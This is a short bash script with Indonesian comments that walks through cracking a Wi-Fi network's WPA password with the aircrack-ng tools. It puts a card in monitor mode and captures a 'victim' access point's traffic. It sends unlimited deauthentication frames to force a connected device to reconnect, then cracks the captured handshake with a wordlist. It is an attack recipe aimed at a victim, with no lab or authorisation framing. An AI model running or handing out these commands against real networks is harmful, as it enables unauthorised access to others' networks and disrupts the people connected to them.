```bash
airmon-ng start wlan0
airodump-ng wlan0 # ingat BSSID dan CHANNEL AP victim

airodump-ng -c<channel_victim> -w <nama_file> -d <bssid_victim> wlan0 # biarkan menyala dan perhatikan Rate perangkat yang terhubung setelah perintah aireplay dijalankan (menunggu mereka terkoneksi kembali)

aireplay-ng --deauth 0 -a <bssid_victim> -c <station_victim> wlan0 # <bssid_victim> = mac AP, <station_victim> = mac Perangkat yang sedang tersambung

aircrack-ng <nama_file> -w <wordlist>

```
